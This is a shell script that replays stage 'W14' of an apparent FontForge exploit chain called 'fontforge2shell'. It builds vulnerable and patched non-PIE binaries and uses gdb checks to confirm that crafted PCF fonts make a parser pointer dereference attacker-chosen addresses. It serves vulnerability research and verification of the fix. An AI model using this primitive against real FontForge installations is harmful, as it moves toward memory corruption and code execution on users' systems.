#!/bin/sh
# fontforge2shell W14: non-PIE chosen mapped-address dereference.
# Usage: FF2S_TARBALL=/path/to/fontforge-20251009.tar.gz sh replay-nonpie.sh
# Offline, no loopback service; builds two local headless trees from the pins.
set -u
cd "$(dirname "$0")" || exit 2
TARBALL=${FF2S_TARBALL:-src/fontforge-20251009.tar.gz}
[ -f "$TARBALL" ] || { echo "missing FF2S_TARBALL: $TARBALL" >&2; exit 2; }
TARBALL=$(readlink -f "$TARBALL")
tar tzf "$TARBALL" >/dev/null 2>&1 || exit 2
[ -f pinned/fix-65e80b5.patch ] || exit 2
[ -d src/fontforge-20251009 ] || { mkdir -p src && tar xzf "$TARBALL" -C src; }
[ -d src/fontforge-fixed ] || {
    cp -a src/fontforge-20251009 src/fontforge-fixed
    ( cd src/fontforge-fixed && patch -p1 < ../../pinned/fix-65e80b5.patch ) || exit 2
}
FLAGS='-DCMAKE_BUILD_TYPE=Debug -DENABLE_GUI=OFF -DENABLE_NATIVE_SCRIPTING=ON -DENABLE_PYTHON_SCRIPTING=OFF -DENABLE_PYTHON_EXTENSION=OFF -DENABLE_DOCS=OFF -DBUILD_SHARED_LIBS=OFF -DENABLE_LIBSPIRO=OFF -DENABLE_LIBGIF=OFF -DENABLE_LIBJPEG=OFF -DENABLE_LIBPNG=OFF -DENABLE_LIBREADLINE=OFF -DENABLE_LIBTIFF=OFF -DENABLE_WOFF2=OFF -DENABLE_HARFBUZZ=OFF'
build() {
    name=$1; tree=$2
    [ -d "$name" ] || cmake -S "$tree" -B "$name" $FLAGS -DENABLE_SANITIZER=none '-DCMAKE_EXE_LINKER_FLAGS=-no-pie' > "$name-configure.log" 2>&1 || exit 2
    [ -x "$name/bin/fontforge" ] || cmake --build "$name" --target fontforgeexe -j2 > "$name-build.log" 2>&1 || exit 2
}
build build-nopie src/fontforge-20251009
build build-fixed-nopie src/fontforge-fixed
python3 make-nonpie-case.py >/dev/null 2>&1 || exit 2

fail=0; total=0
check() {
    label=$1; shift
    total=$((total+1))
    if "$@"; then printf 'PASS %s\n' "$label"; else printf 'FAIL %s\n' "$label"; fail=$((fail+1)); fi
}
has() { grep -qF "$1" "$2"; }
hasnt() { ! grep -qF "$1" "$2"; }
hasre() { grep -qE "$1" "$2"; }
rc0() { "$@" >/dev/null 2>&1; test $? -eq 0; }

for b in build-nopie build-fixed-nopie; do
    check "$b is ET_EXEC (non-PIE)" sh -c "readelf -h $b/bin/fontforge | grep -qF 'EXEC (Executable file)'"
done

for n in a b; do
    gdb -q -batch -x "gdb-value-nonpie-$n.cmd" ./build-nopie/bin/fontforge \
        > "replay-nonpie-gdb-$n.out" 2>&1
    check "plain value-nonpie-$n rc 0" rc0 ./build-nopie/bin/fontforge -script "import-value-nonpie-$n-nopie.ff"
done
check 'gdb a pointer = chosen 0x414243' has 'bfc->bitmap=0x414243 pt=0x414243' replay-nonpie-gdb-a.out
check 'gdb a address inside binary symbol' has '0x414243 <' replay-nonpie-gdb-a.out
check 'gdb a reads chosen mapped bytes' hasre '0x0f[[:space:]]+0x5e[[:space:]]+0x45[[:space:]]+0xf0' replay-nonpie-gdb-a.out
check 'gdb b pointer = chosen 0x5a4344' has 'bfc->bitmap=0x5a4344 pt=0x5a4344' replay-nonpie-gdb-b.out
check 'gdb b address inside binary symbol' has '0x5a4344 <' replay-nonpie-gdb-b.out
check 'gdb b reads different mapped bytes' hasre '0x8b[[:space:]]+0x30[[:space:]]+0x8b[[:space:]]+0x4d' replay-nonpie-gdb-b.out
check 'saved SFDs differ between chosen targets' sh -c '! cmp -s /tmp/ff2s-w14-value-nonpie-a.sfd /tmp/ff2s-w14-value-nonpie-b.sfd'

gdb -q -batch -x gdb-value-probe-nopie.cmd ./build-nopie/bin/fontforge \
    > replay-nonpie-gdb-probe.out 2>&1
check 'in-bounds probe keeps heap pointer' hasnt 'bfc->bitmap=0x414243' replay-nonpie-gdb-probe.out
check 'in-bounds probe plain rc 0' rc0 ./build-nopie/bin/fontforge -script import-value-probe-nopie.ff

gdb -q -batch -x gdb-fixed-nopie.cmd ./build-fixed-nopie/bin/fontforge \
    > replay-nonpie-gdb-fixed.out 2>&1
check 'patched build keeps heap pointer' hasnt 'bfc->bitmap=0x414243' replay-nonpie-gdb-fixed.out
check 'patched build plain rc 0' rc0 ./build-fixed-nopie/bin/fontforge -script import-value-nonpie-a-nopie.ff

echo '=== W14 pins ==='
sha256sum value-nonpie-a.pcf value-nonpie-b.pcf value-probe.pcf
echo "REPLAY_NONPIE_OK: $total checks, $fail failed"
[ "$fail" -eq 0 ]
